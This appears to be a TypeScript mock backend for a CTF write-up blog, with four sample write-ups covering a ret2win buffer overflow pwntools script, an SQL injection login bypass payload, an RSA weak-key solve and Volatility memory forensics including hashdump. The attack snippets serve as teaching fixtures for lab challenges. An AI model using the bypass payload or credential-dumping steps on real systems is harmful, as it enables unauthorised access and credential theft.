import type { backendInterface, Writeup, ImageRecord, PagedWriteups } from "../backend.d";
import { Category, Difficulty } from "../backend.d";

const sampleWriteups: Writeup[] = [
  {
    id: BigInt(1),
    title: "Buffer Overflow Basics — HTB Baby PWN",
    content: JSON.stringify({
      blocks: [
        { type: "paragraph", content: "This challenge introduces classic stack buffer overflow exploitation. We start by analyzing the binary with checksec and finding the vulnerability." },
        { type: "heading", level: 2, content: "Initial Analysis" },
        { type: "paragraph", content: "Running checksec on the binary shows NX enabled but no ASLR. The vulnerable function uses gets() without bounds checking." },
        { type: "code", language: "bash", code: "$ checksec --file=babypwn\n[*] '/ctf/babypwn'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)", lineNumbers: true },
        { type: "paragraph", content: "With no stack canary and no PIE, we can overwrite the return address directly." },
        { type: "heading", level: 2, content: "Exploitation" },
        { type: "code", language: "python", code: "from pwn import *\n\np = process('./babypwn')\n\n# Offset found with pattern_create\noffset = 40\n\n# ret2win gadget\nwin_addr = 0x401196\n\npayload = b'A' * offset\npayload += p64(win_addr)\n\np.sendline(payload)\nprint(p.recvall())", lineNumbers: true },
        { type: "paragraph", content: "Running the exploit gives us the flag!" },
      ]
    }),
    flag: "HTB{b4by_buff3r_0v3rfl0w_ftw}",
    difficulty: Difficulty.easy,
    createdAt: BigInt(Date.now() * 1000000 - 86400000000000),
    slug: "htb-baby-pwn-buffer-overflow",
    tags: ["pwn", "buffer-overflow", "ret2win", "hackthebox"],
    updatedAt: BigInt(Date.now() * 1000000),
    flagHidden: true,
    category: Category.pwn,
    dateSolved: "2026-04-10",
    draft: false,
  },
  {
    id: BigInt(2),
    title: "SQL Injection — PicoCTF Web Gauntlet",
    content: JSON.stringify({
      blocks: [
        { type: "paragraph", content: "A classic SQL injection challenge from PicoCTF. The login form is vulnerable to authentication bypass." },
        { type: "heading", level: 2, content: "Reconnaissance" },
        { type: "paragraph", content: "Testing the login form with single quote reveals an SQL error, confirming injection vulnerability." },
        { type: "code", language: "sql", code: "-- Payload used for authentication bypass\nusername: admin'--\npassword: anything\n\n-- Resulting query:\nSELECT * FROM users WHERE username='admin'--' AND password='anything'", lineNumbers: true },
        { type: "heading", level: 2, content: "Flag Extraction" },
        { type: "paragraph", content: "After bypassing login, we find the flag in the admin dashboard." },
      ]
    }),
    flag: "picoCTF{sql_1nj3ct10n_3z_m0d3}",
    difficulty: Difficulty.medium,
    createdAt: BigInt(Date.now() * 1000000 - 172800000000000),
    slug: "picoctf-web-gauntlet-sqli",
    tags: ["web", "sqli", "picoctf", "authentication"],
    updatedAt: BigInt(Date.now() * 1000000),
    flagHidden: true,
    category: Category.web,
    dateSolved: "2026-04-08",
    draft: false,
  },
  {
    id: BigInt(3),
    title: "RSA Weak Key — Crypto CTF 2025",
    content: JSON.stringify({
      blocks: [
        { type: "paragraph", content: "This RSA challenge uses a weak key with small prime factors that can be factored quickly." },
        { type: "heading", level: 2, content: "Challenge Files" },
        { type: "code", language: "python", code: "n = 0xdeadbeefcafe...\ne = 65537\nc = 0x1337deadbeef...", lineNumbers: false },
        { type: "paragraph", content: "Using factordb to find the prime factorization of n." },
        { type: "code", language: "python", code: "from Crypto.Util.number import long_to_bytes\nfrom sympy import factorint\n\nn = 0xdeadbeef...\ne = 65537\nc = 0x1337...\n\n# Factor n\nfactors = factorint(n)\np, q = list(factors.keys())\n\nphi = (p-1)*(q-1)\nd = pow(e, -1, phi)\nm = pow(c, d, n)\nprint(long_to_bytes(m))", lineNumbers: true },
      ]
    }),
    flag: "CTF{w34k_rs4_k3y5_4r3_d4ng3r0u5}",
    difficulty: Difficulty.hard,
    createdAt: BigInt(Date.now() * 1000000 - 259200000000000),
    slug: "crypto-ctf-2025-rsa-weak-key",
    tags: ["crypto", "rsa", "factoring", "number-theory"],
    updatedAt: BigInt(Date.now() * 1000000),
    flagHidden: true,
    category: Category.crypto,
    dateSolved: "2026-04-05",
    draft: false,
  },
  {
    id: BigInt(4),
    title: "Memory Forensics — Volatility Analysis",
    content: JSON.stringify({
      blocks: [
        { type: "paragraph", content: "A memory dump forensics challenge requiring Volatility framework analysis to find hidden credentials." },
        { type: "heading", level: 2, content: "Memory Analysis" },
        { type: "code", language: "bash", code: "$ volatility -f memory.dmp --profile=Win10x64 pslist\n$ volatility -f memory.dmp --profile=Win10x64 hashdump\n$ volatility -f memory.dmp --profile=Win10x64 filescan | grep flag", lineNumbers: true },
      ]
    }),
    flag: "CTF{m3m0ry_f0r3ns1cs_m4st3r}",
    difficulty: Difficulty.insane,
    createdAt: BigInt(Date.now() * 1000000 - 345600000000000),
    slug: "memory-forensics-volatility",
    tags: ["forensics", "volatility", "memory", "windows"],
    updatedAt: BigInt(Date.now() * 1000000),
    flagHidden: true,
    category: Category.forensics,
    dateSolved: "2026-04-02",
    draft: false,
  },
];

const sampleImages: ImageRecord[] = [];

export const mockBackend: backendInterface = {
  claimAdmin: async () => ({ __kind__: "ok", ok: null }),
  createWriteup: async () => ({ __kind__: "ok", ok: BigInt(5) }),
  deleteImage: async () => ({ __kind__: "ok", ok: null }),
  deleteWriteup: async () => ({ __kind__: "ok", ok: null }),
  getAllTags: async () => ["pwn", "buffer-overflow", "ret2win", "hackthebox", "web", "sqli", "picoctf", "crypto", "rsa", "forensics", "volatility"],
  getRelatedWriteups: async (id, limit) => sampleWriteups.filter(w => w.id !== id).slice(0, Number(limit)),
  getRssFeed: async () => '<?xml version="1.0"?><rss version="2.0"><channel><title>CTF Writeups</title></channel></rss>',
  getSitemap: async () => '<?xml version="1.0"?><urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"></urlset>',
  getWriteup: async (id) => sampleWriteups.find(w => w.id === id) ?? null,
  getWriteupBySlug: async (slug) => sampleWriteups.find(w => w.slug === slug) ?? null,
  getWriteupsByCategory: async (category) => sampleWriteups.filter(w => w.category === category),
  getWriteupsByTag: async (tag) => sampleWriteups.filter(w => w.tags.includes(tag)),
  isAdmin: async () => true,
  listAllWriteups: async () => sampleWriteups,
  listAllPublishedWriteups: async () => sampleWriteups.filter(w => !w.draft),
  listImages: async () => sampleImages,
  listPublishedWriteups: async (page, pageSize) => {
    const published = sampleWriteups.filter(w => !w.draft);
    const start = Number(page) * Number(pageSize);
    return {
      total: BigInt(published.length),
      writeups: published.slice(start, start + Number(pageSize)),
    } as PagedWriteups;
  },
  searchWriteups: async (queryText) => sampleWriteups.filter(w =>
    w.title.toLowerCase().includes(queryText.toLowerCase()) ||
    w.tags.some(t => t.toLowerCase().includes(queryText.toLowerCase()))
  ),
  updateWriteup: async () => ({ __kind__: "ok", ok: null }),
  uploadImage: async () => ({ __kind__: "ok", ok: "/uploads/mock-image.png" }),
};
